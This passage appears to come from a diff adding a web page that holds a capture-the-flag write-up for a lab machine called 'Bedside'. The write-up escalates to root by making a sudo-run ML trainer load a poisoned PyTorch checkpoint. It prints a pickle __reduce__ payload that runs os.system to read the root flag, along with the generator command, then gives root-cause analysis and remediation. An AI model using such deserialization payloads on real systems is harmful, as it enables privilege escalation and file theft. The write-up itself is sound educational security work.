+### 6.7 Triggering the root trainer
+
+Switch back to the host shell:
+
+```text
+developer@bedside:~$
+```
+
+Execute the permitted command:
+
+```bash
+sudo -n /usr/bin/python3 /opt/trainer/bedside_trainer.py
+```
+
+The `-n` option prevents an interactive password prompt.
+
+An earlier attempt using additional trainer arguments failed because the arguments did not match the exact sudoers permission.
+
+The allowed invocation runs the original trainer with its defaults.
+
+The intended execution path was:
+
+```text
+sudo
+  |
+  v
+Python trainer (root)
+  |
+  v
+Load valid training image
+  |
+  v
+Build model
+  |
+  v
+Find latest checkpoint
+  |
+  v
+/datastore/checkpoints/root.pt
+  |
+  v
+MONAI CheckpointLoader
+  |
+  v
+Unsafe PyTorch deserialization
+  |
+  v
+Payload.__reduce__()
+  |
+  v
+Execute command as root
+```
+
+A subsequent model-loading exception does not necessarily mean the payload failed. Deserialization executes the embedded callable before the loader attempts to interpret the returned object as a model state dictionary.
+
+### 6.8 Confirming root privileges
+
+The final proof file was checked from the `developer` shell:
+
+```bash
+cat /tmp/bedside-root-proof.txt
+```
+
+The verified output was:
+
+```text
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+This conclusively demonstrated root-context command execution.
+
+## 7. Root Flag Access Demonstration
+
+After confirming root execution, the checkpoint payload was modified to demonstrate access to a root-only file.
+
+The modified `__reduce__()` method was:
+
+```python
+def __reduce__(self):
+    return (
+        eval,
+        (
+            "(__import__('os').system("
+            "'cat /root/root.txt > /tmp/bedside-root-proof.txt'"
+            "), {})[1]",
+        ),
+    )
+```
+
+This changes the payload from executing `id` to reading the root flag into the proof file.
+
+The equivalent command-line option for the generator was:
+
+```bash
+python3 build_checkpoint.py \
+  -o checkpoint_epoch_99.pt \
+  -c "cat /root/root.txt > /tmp/bedside-root-proof.txt"
+```
+
+Following transfer and trainer execution, the resulting file can be inspected with:
+
+```bash
+cat /tmp/bedside-root-proof.txt
+```
+
+**Evidence status:** Root command execution was verified through the `uid=0(root)` result. The root-file-access payload was subsequently reported as executed, but the root flag contents are omitted from this public write-up.
+
+## 8. Complete Attack Chain
+
+```text
+┌──────────────────────────────────┐
+│ Kali Linux                       │
+│ 10.10.15.82                      │
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ research.bedside.htb             │
+│ File upload portal               │
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ Crafted PDF + malicious pickle   │
+│ pdfminer.six CMap deserialization│
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ Docker container                 │
+│ User: datawrangler               │
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ Internal image viewer :3000      │
+│ Directory traversal              │
+│ (Reference write-up stage)       │
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ Host SSH access                  │
+│ User: developer                  │
+│ User flag obtained               │
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ Passwordless sudo trainer        │
+│ /opt/trainer/bedside_trainer.py  │
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ Attacker-controlled .pt          │
+│ /datastore/checkpoints/root.pt   │
+└────────────────┬─────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────┐
+│ Unsafe PyTorch deserialization   │
+│ Root command execution           │
+└──────────────────────────────────┘
+```
+
+## 9. Vulnerability Summary
+
+| Stage | Vulnerability | Impact |
+|---|---|---|
+| Research portal | Unsafe PDFMiner CMap deserialization | Remote command execution |
+| Internal image viewer | Directory traversal | Unauthorized host file disclosure |
+| SSH lateral movement | Exposure of private SSH key | Developer account access |
+| Training pipeline | Unsafe PyTorch checkpoint deserialization | Root code execution |
+| Privilege boundary | Root-run trainer consumes writable shared data | Local privilege escalation |
+
+The central issue was the combination of unsafe deserialization and weak trust boundaries.
+
+For the PDF processor, externally submitted data was eventually interpreted as executable Python pickle content.
+
+For the trainer, a root-privileged application trusted model checkpoint files writable by a lower-privileged account.
+
+The first unsafe deserialization enabled initial access. The second enabled privilege escalation.
+
+## 10. Root Cause Analysis
+
+### 10.1 Unsafe PDF processing
+
+CMap resources were loaded using a mechanism involving `pickle.loads()`.
+
+The application allowed an attacker to control both a pickle file and a PDF reference to that file.
+
+This enabled untrusted data to reach a deserialization function capable of executing code.
+
+### 10.2 Improper file-serving restrictions
+
+The internal image viewer permitted traversal beyond its intended document root.
+
+The reference walkthrough demonstrated exposure of host files, including a developer SSH key.
+
+The issue was not the simulated frontend image API, but the file-serving behavior of the underlying service.
+
+### 10.3 Unsafe model checkpoint loading
+
+The trainer used MONAI's `CheckpointLoader` to load `.pt` files.
+
+The checkpoint directory was writable by the `datawrangler` account, but the loading process executed as root.
+
+This allowed attacker-controlled serialized content to cross a privilege boundary.
+
+### 10.4 Excessive execution privileges
+
+The training script was permitted to execute as root using a passwordless sudo rule.
+
+Although root privileges were described as necessary for optional hardware scanner support, the normal training path also ran under those privileges.
+
+Consequently, a compromised checkpoint-loading operation inherited full root authority.
+
+## 11. Remediation Recommendations
+
+**PDF processing**
+
+- Upgrade `pdfminer.six` to a release that addresses the vulnerable CMap handling.
+- Avoid pickle-based loading of untrusted PDF-related resources.
+- Validate resource paths and prohibit references to attacker-writable directories.
+- Run document processors in strongly isolated, minimally privileged environments.
+
+**Internal image viewer**
+
+- Ensure static files are served only from an explicitly configured document root.
+- Canonicalize and validate paths before opening files.
+- Reject traversal attempts.
+- Restrict access to internal services and prevent exposure of credentials.
+
+**Machine learning training pipeline**
+
+- Avoid loading untrusted PyTorch checkpoints with unsafe deserialization.
+- Prefer safer loading mechanisms such as `weights_only=True`, where compatible, and formats that do not require arbitrary Python object deserialization.
+- Protect checkpoint directories from writes by untrusted accounts.
+- Verify checkpoint provenance and integrity.
+- Separate ingestion, preprocessing and training permissions.
+- Run training services as dedicated non-root accounts.
+- Restrict sudo permissions to narrowly scoped privileged operations.
+
+**Shared storage**
+
+- Do not share writable checkpoint directories across different trust levels.
+- Apply least-privilege ownership and permissions to datastore directories.
+- Separate untrusted staging data from trusted model artifacts.
+
+## 12. Lessons Learned
+
+Bedside demonstrates how two separate deserialization mistakes can be combined into a complete compromise.
+
+The first vulnerability was exposed through a user-facing upload workflow. The second was exposed through a privileged machine-learning workflow. Both relied on trusting serialized data controlled by an attacker.
+
+The investigation also highlighted the importance of understanding background processing behavior. The original upload was not itself responsible for executing the malicious pickle; the execution occurred when a periodic PDF watcher selected and parsed the triggering document.
+
+The lateral-movement stage illustrates the risks of internal services that are assumed to be unreachable from external networks. Once an attacker controls a container, internal application and management interfaces may become accessible.
+
+Finally, the privilege-escalation stage demonstrated how a shared writable directory can undermine an otherwise restricted sudo configuration. The attacker did not need to modify the root-owned training script. Controlling the input file consumed by that script was sufficient.
+
+The broader security lesson is that serialized model artifacts and document-processing resources must be treated as potentially executable inputs, not inherently trustworthy data. Running programs that consume those inputs with elevated privileges can turn a limited file-write capability into full system compromise.
+  </script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/12.0.2/marked.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>
+    (function () {
+      var src = document.getElementById('md').textContent;
+      var contentEl = document.getElementById('content');
+
+      function slugify(t) {
+        return t.toLowerCase().replace(/[^\w]+/g, '-').replace(/^-+|-+$/g, '');
+      }
+
+      if (!window.marked) {
+        contentEl.innerHTML = '<p class="loading">Could not load the Markdown renderer. ' +
+          'View the raw writeup source instead.</p>';
+        return;
+      }
+
+      marked.setOptions({ gfm: true, breaks: false });
+      contentEl.innerHTML = marked.parse(src);
+
+      // Wrap tables for horizontal scroll on mobile
+      contentEl.querySelectorAll('table').forEach(function (tbl) {
+        var wrap = document.createElement('div');
+        wrap.className = 'table-wrap';
+        tbl.parentNode.insertBefore(wrap, tbl);
+        wrap.appendChild(tbl);
+      });
+
+      // Syntax highlighting
+      if (window.hljs) {
+        contentEl.querySelectorAll('pre code').forEach(function (block) {
+          try { hljs.highlightElement(block); } catch (e) {}
+        });
+      }
+
+      // Build TOC from h2 headings
+      var toc = document.getElementById('toc');
+      var headings = contentEl.querySelectorAll('h2');
+      var tocLinks = [];
+      headings.forEach(function (h) {
+        if (!h.id) h.id = slugify(h.textContent);
+        var a = document.createElement('a');
+        a.href = '#' + h.id;
+        a.textContent = h.textContent;
+        toc.appendChild(a);
+        tocLinks.push(a);
+      });
+
+      // Scroll-spy
+      var spy = function () {
+        var pos = window.scrollY + 120;
+        var current = null;
+        headings.forEach(function (h) {
+          if (h.offsetTop <= pos) current = h.id;
+        });
+        tocLinks.forEach(function (a) {
+          a.classList.toggle('active', a.getAttribute('href') === '#' + current);
+        });
+      };
+      window.addEventListener('scroll', spy, { passive: true });
+      spy();
+    })();
+  </script>
+</body>
+</html>
